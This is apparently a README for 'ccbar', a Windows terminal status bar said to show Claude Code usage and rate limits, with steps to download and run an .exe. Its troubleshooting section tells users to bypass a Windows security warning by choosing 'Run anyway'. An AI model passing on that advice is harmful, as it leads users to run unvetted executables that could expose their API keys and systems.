📋 What is ccbar?

ccbar provides a live view of your Claude Code workspace. It sits in your terminal and shows your current model, effort levels, and workspace status. You also see your usage metrics and rate limits update in real time. This tool removes the guesswork from your development workflow by placing essential limits and usage data front and center.

✨ Key Features

  • • Live Usage Monitor: Track your token usage and rate limits as you work.
  • • Workspace Insights: See which model and effort settings you currently use.
  • • Clean Terminal Integration: The status line stays out of your way while providing all necessary information.
  • • Customizable View: Configure the bar to show the data you find most helpful.

🚀 How to Install

Follow these steps to set up ccbar on your Windows computer:

  1. Visit the project download page.
  2. Scroll to the section labeled Assets under the latest version.
  3. Select the file ending in .exe to start the download.
  4. Save the file to a folder you can reach easily, such as your Downloads folder.
  5. Open your Command Prompt or PowerShell window.
  6. Navigate to the folder where you saved the file.
  7. Run the application by typing the name of the file and pressing Enter.

💻 System Requirements

To run ccbar, you need a standard Windows 10 or 11 system. You should have a terminal application installed, such as Windows Terminal or the standard Command Prompt. ccbar does not require complex software or background services to function. It uses minimal system resources and updates its visual readout based on your live interaction with the Claude API.

⚙️ Configuration

You can adjust the behavior of the status bar by editing the configuration file. The file lives in your home folder under a hidden settings directory. You can specify which metrics appear on the bar and change the color schemes to match your terminal theme. Open the config file in Notepad, update your preferences, and restart your terminal to see the changes.

🔧 Troubleshooting

If the bar does not appear, ensure you have an active internet connection, as the tool fetches data from Claude servers. Check that your API keys are set correctly in your system environment variables. If you receive a security warning when you open the file, select "More info" and then "Run anyway" to allow the application to launch. This is a common step for new tools on Windows.
